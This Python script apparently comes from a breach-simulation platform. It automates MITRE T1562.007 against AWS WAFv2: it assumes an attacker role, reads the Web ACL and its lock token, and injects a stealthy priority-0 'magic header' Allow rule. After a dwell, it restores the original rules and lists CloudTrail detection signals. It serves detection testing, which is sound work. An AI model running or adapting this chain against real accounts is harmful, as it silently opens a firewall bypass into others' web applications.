"""
ATOMIC-WAFV2-DISABLE-WEB-ACL -- Automated Attack Script
T1562.007: Impair Defenses: Disable or Modify Cloud Firewall

4-step attack chain:
  1. AssumeRole  -> attacker_role_session
  2. ListWebACLs -> confirm victim ACL present
  3. GetWebACL   -> capture LockToken + pre-attack config
  4. UpdateWebACL inject (ByteMatch Allow, priority 0) + dwell + restore
"""
import sys
import time
import random
import secrets
import json
import pathlib

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError

# Dwell time between inject and restore (attack plan recommendation: 300s)
DWELL_SECONDS = 300

# ── Resource names: single source of truth ──────────────────────────────────
# attack.py lives at <campaign>/attack.py; resource_names.json is at <campaign>/infra/
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} -- names will fall back to defaults")

_R   = _NAMES.get("resources", {})
_PKS = _NAMES.get("pulumi_export_keys", {})


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json['resources']."""
    return _R.get(key) or default


def _p(outputs, key, default=""):
    """Resolve a dynamic Pulumi output: pulumi_export_keys[key] -> outputs[export_key]."""
    export_key = _PKS.get(key, key)
    return outputs.get(export_key) or default


# =============================================================================
# Timing helpers
# =============================================================================
def op_delay(min_s: float = 2.0, max_s: float = 6.0) -> None:
    time.sleep(random.uniform(min_s, max_s))


def phase_delay() -> None:
    time.sleep(random.uniform(5, 15))


# =============================================================================
# Print helpers (ASCII only)
# =============================================================================
def print_step(msg: str) -> None:
    print(f"\n[*] {msg}")


def print_ok(msg: str) -> None:
    print(f"[+] {msg}")


def print_err(msg: str) -> None:
    print(f"[-] {msg}")


def print_info(msg: str) -> None:
    print(f"    {msg}")


# =============================================================================
# Entry point (backend contract)
# =============================================================================
def _bootstrap_session(outputs: dict, region: str):
    """Session for the initial STS AssumeRole call.

    In the MayaTrail backend the worker injects the tenant's short-lived
    assumed-role credentials as outputs['_aws_credentials']; use them so the
    attack runs in the tenant account, not the worker's. Falls back to the
    ambient default session for standalone runs.
    """
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    Execute the 4-step T1562.007 WAFv2 magic-header injection chain.

    All dynamic resource values (IDs, ARNs, names set at deploy time) come from
    `outputs` via _p(). Static AWS resource names (determined at authoring time,
    matching __main__.py literals) come from resource_names.json via _r().
    No env-var reads, no on-disk credential files, no subprocess calls.
    """

    # -- Dynamic values from Pulumi stack outputs (via _p) --------------------
    attacker_role_arn = _p(outputs, "attacker_role_arn")
    web_acl_id        = _p(outputs, "web_acl_id")
    web_acl_name      = _p(outputs, "web_acl_name")
    scope             = _p(outputs, "web_acl_scope") or _r("web_acl_scope", "REGIONAL")

    if not attacker_role_arn:
        raise RuntimeError("Missing required Pulumi output: attacker_role_arn")
    if not web_acl_id:
        raise RuntimeError("Missing required Pulumi output: web_acl_id")
    if not web_acl_name:
        raise RuntimeError("Missing required Pulumi output: web_acl_name")

    # -- Static resource names (from resource_names.json via _r) --------------
    attacker_role_name = _r("attacker_role", "atomic-wafv2-disable-web-acl-attacker-role")

    print("\n" + "=" * 60)
    print(" ATOMIC-WAFV2-DISABLE-WEB-ACL  |  T1562.007")
    print("=" * 60)
    print_info(f"Region         : {region}")
    print_info(f"Attacker role  : {attacker_role_arn}")
    print_info(f"Target Web ACL : {web_acl_name} ({web_acl_id})")
    print_info(f"Scope          : {scope}")

    events_generated = []

    # =========================================================================
    # PHASE 1: Defense Evasion -- WAFv2 Magic-Header Rule Injection
    # =========================================================================
    print("\n" + "=" * 60)
    print(" PHASE 1: Defense Evasion -- WAFv2 Magic-Header Rule Injection")
    print("=" * 60)

    # -------------------------------------------------------------------------
    # Step 1: AssumeRole -> attacker_role_session
    # -------------------------------------------------------------------------
    print_step("Step 1: AssumeRole -> attacker_role_session (T1562.007)")
    print_info("Modelling compromised over-permissioned WAF operator credential.")
    print_info(f"Role ARN : {attacker_role_arn}")

    default_sts = _bootstrap_session(outputs, region).client("sts")
    try:
        assume_resp = default_sts.assume_role(
            RoleArn=attacker_role_arn,
            RoleSessionName="atomic-t1562007-session",
            DurationSeconds=3600,
        )
    except ClientError as e:
        raise RuntimeError(f"AssumeRole failed: {e}") from e

    creds = assume_resp["Credentials"]
    attacker_session = boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )
    print_ok(f"AssumeRole succeeded -- session key: {creds['AccessKeyId']}")
    events_generated.append(
        "AssumeRole (sts.amazonaws.com) -- roleSessionName=atomic-t1562007-session"
    )
    op_delay(2, 4)

    wafv2 = attacker_session.client("wafv2", region_name=region)

    # -------------------------------------------------------------------------
    # Step 2: ListWebACLs -- initial enumeration
    # -------------------------------------------------------------------------
    print_step("Step 2: ListWebACLs -- enumerate regional Web ACLs (T1562.007)")
    print_info("Realistic attacker enumeration with over-scoped WAF credentials.")

    found_acl = None
    next_marker = None
    page = 0
    while True:
        page += 1
        list_kwargs = {"Scope": scope, "Limit": 100}
        if next_marker:
            list_kwargs["NextMarker"] = next_marker
        try:
            list_resp = wafv2.list_web_acls(**list_kwargs)
        except ClientError as e:
            print_err(f"ListWebACLs page {page} error: {e}")
            break

        acls = list_resp.get("WebACLs", [])
        print_ok(f"ListWebACLs page {page}: {len(acls)} ACL(s) returned")
        for acl in acls:
            print_info(f"  Name={acl['Name']}  Id={acl['Id']}")
            if acl["Name"] == web_acl_name and acl["Id"] == web_acl_id:
                found_acl = acl
                print_ok(f"Victim ACL confirmed: {acl['Name']}")

        next_marker = list_resp.get("NextMarker")
        if not next_marker:
            break

    events_generated.append(
        "ListWebACLs (wafv2.amazonaws.com) -- REGIONAL enumeration from attacker-role session"
    )

    if not found_acl:
        print_err(
            f"Victim ACL not found in listing (id={web_acl_id}); continuing with output values."
        )
    op_delay(2, 4)

    # -------------------------------------------------------------------------
    # Step 3: GetWebACL -- read full config + LockToken
    # -------------------------------------------------------------------------
    print_step("Step 3: GetWebACL -- read config + LockToken (T1562.007)")
    print_info("LockToken mandatory for UpdateWebACL (WAFOptimisticLockException if stale).")
    print_info("Saving pre_attack_rules for teardown restore.")

    try:
        get_resp = wafv2.get_web_acl(
            Name=web_acl_name,
            Id=web_acl_id,
            Scope=scope,
        )
    except ClientError as e:
        raise RuntimeError(f"GetWebACL failed: {e}") from e

    lock_token       = get_resp["LockToken"]
    web_acl_obj      = get_resp["WebACL"]
    pre_attack_rules = web_acl_obj["Rules"]
    default_action   = web_acl_obj["DefaultAction"]
    visibility_cfg   = web_acl_obj["VisibilityConfig"]

    print_ok(f"GetWebACL succeeded -- LockToken={lock_token[:8]}...")
    print_info(f"Existing rules: {[r['Name'] for r in pre_attack_rules]}")
    events_generated.append(
        "GetWebACL (wafv2.amazonaws.com) -- exposes attacker interest in ACL config + LockToken"
    )
    op_delay(2, 5)

    # -------------------------------------------------------------------------
    # Step 4a: UpdateWebACL -- inject magic-header ByteMatch Allow rule
    #
    # Priority-0 ByteMatch Allow on SingleHeader x-bypass is prepended ahead of
    # AWSManagedRulesCommonRuleSet (priority 10). Full config is round-tripped so
    # the managed rule group is preserved, making the modification stealthy.
    # CloudTrail requestParameters.rules[0].statement.byteMatchStatement exposes
    # the header name, positional constraint, and SearchString in plaintext.
    # -------------------------------------------------------------------------
    print_step("Step 4: UpdateWebACL -- inject magic-header ByteMatch Allow rule (T1562.007)")
    print_info("Priority-0 ByteMatch Allow on SingleHeader x-bypass prepended ahead of")
    print_info("AWSManagedRulesCommonRuleSet (priority 10). Full config round-tripped.")

    magic_secret = secrets.token_hex(16)
    magic_rule = {
        "Name": "MagicHeaderAllow",
        "Priority": 0,
        "Statement": {
            "ByteMatchStatement": {
                "SearchString": magic_secret.encode("utf-8"),
                "FieldToMatch": {
                    "SingleHeader": {"Name": "x-bypass"},
                },
                "TextTransformations": [{"Priority": 0, "Type": "NONE"}],
                "PositionalConstraint": "EXACTLY",
            }
        },
        "Action": {"Allow": {}},
        "VisibilityConfig": {
            "SampledRequestsEnabled": True,
            "CloudWatchMetricsEnabled": True,
            "MetricName": "MagicHeaderAllow",
        },
    }

    injected_rules = [magic_rule] + pre_attack_rules
    inject_succeeded = False

    try:
        upd_resp = wafv2.update_web_acl(
            Name=web_acl_name,
            Id=web_acl_id,
            Scope=scope,
            DefaultAction=default_action,
            Rules=injected_rules,
            VisibilityConfig=visibility_cfg,
            LockToken=lock_token,
        )
        next_lock = upd_resp.get("NextLockToken", "")
        print_ok(
            "UpdateWebACL (inject) succeeded"
            f" -- NextLockToken={next_lock[:8] if next_lock else 'N/A'}..."
        )
        print_ok(
            f"Injected: MagicHeaderAllow priority=0  header=x-bypass  value=<{magic_secret[:6]}...>"
        )
        events_generated.append(
            "UpdateWebACL inject (wafv2.amazonaws.com) -- ByteMatch Allow on x-bypass at priority 0"
        )
        inject_succeeded = True
    except ClientError as e:
        code = e.response["Error"]["Code"]
        if code == "WAFOptimisticLockException":
            print_err("WAFOptimisticLockException on inject (stale LockToken) -- skipping inject.")
            print_err("Restore will still be attempted with a fresh token.")
        else:
            raise RuntimeError(f"UpdateWebACL inject failed: {e}") from e

    # Dwell -- attacker holds the bypass rule before cleanup
    if inject_succeeded:
        print_info(f"Dwell {DWELL_SECONDS}s (simulating attacker holding access before cleanup)...")
        time.sleep(DWELL_SECONDS)

    # -------------------------------------------------------------------------
    # Step 4b: Restore -- fresh GetWebACL + UpdateWebACL with original rules
    #
    # The LockToken from Step 3 is stale after dwell; WAFOptimisticLockException
    # is expected if reused. Always re-issue GetWebACL for a fresh token first.
    # Retry once on WAFOptimisticLockException (attack plan specifies one retry).
    # -------------------------------------------------------------------------
    print_step("Step 4b: Restore original Web ACL rules (teardown)")
    print_info("Re-issuing GetWebACL to obtain fresh LockToken before restore.")

    restored = False
    for attempt in range(1, 3):
        try:
            fresh_get = wafv2.get_web_acl(
                Name=web_acl_name,
                Id=web_acl_id,
                Scope=scope,
            )
            fresh_lock_token = fresh_get["LockToken"]
        except ClientError as e:
            print_err(f"GetWebACL (restore token fetch, attempt {attempt}): {e}")
            op_delay(2, 4)
            continue

        try:
            wafv2.update_web_acl(
                Name=web_acl_name,
                Id=web_acl_id,
                Scope=scope,
                DefaultAction=default_action,
                Rules=pre_attack_rules,
                VisibilityConfig=visibility_cfg,
                LockToken=fresh_lock_token,
            )
            print_ok(f"UpdateWebACL (restore) succeeded on attempt {attempt}")
            print_ok("MagicHeaderAllow rule removed -- Web ACL restored to pre-attack state")
            events_generated.append(
                "GetWebACL restore-token (wafv2.amazonaws.com) -- fresh LockToken for teardown"
            )
            events_generated.append(
                "UpdateWebACL restore (wafv2.amazonaws.com) -- original rules re-applied"
            )
            restored = True
            break
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "WAFOptimisticLockException" and attempt < 2:
                print_err(
                    f"WAFOptimisticLockException on restore attempt {attempt} -- retrying..."
                )
                op_delay(3, 6)
            else:
                print_err(f"UpdateWebACL restore failed (attempt {attempt}): {e}")
                break

    if not restored:
        print_err(
            "WARN: Web ACL restore did not complete -- manual cleanup required before pulumi destroy"
        )

    # =========================================================================
    # Summary
    # =========================================================================
    print("\n" + "=" * 60)
    print(" ATTACK SUMMARY")
    print("=" * 60)
    print_info("Technique  : T1562.007 -- Impair Defenses: Disable or Modify Cloud Firewall")
    print_info("Tactic     : Defense Evasion")
    print_info(f"Target ACL : {web_acl_name} ({web_acl_id})")
    print_info(f"Scope      : {scope}")
    print_info(f"Role used  : {attacker_role_name}")
    print_info(f"Restored   : {'yes' if restored else 'NO -- manual restore needed'}")
    print_info("")
    print_info(f"CloudTrail events generated ({len(events_generated)}):")
    for i, ev in enumerate(events_generated, 1):
        print_info(f"  {i}. {ev}")
    print_info("")
    print_info("Detection signals:")
    print_info("  - AssumeRole from :root to attacker role session atomic-t1562007-session")
    print_info("  - ListWebACLs enumeration from assumed-role session")
    print_info("  - GetWebACL -- signals attacker interest in ACL config and LockToken")
    print_info("  - UpdateWebACL with ByteMatch Allow on SingleHeader x-bypass at priority 0")
    print_info("    (requestParameters.rules[0].statement.byteMatchStatement in CloudTrail)")
    print("=" * 60 + "\n")
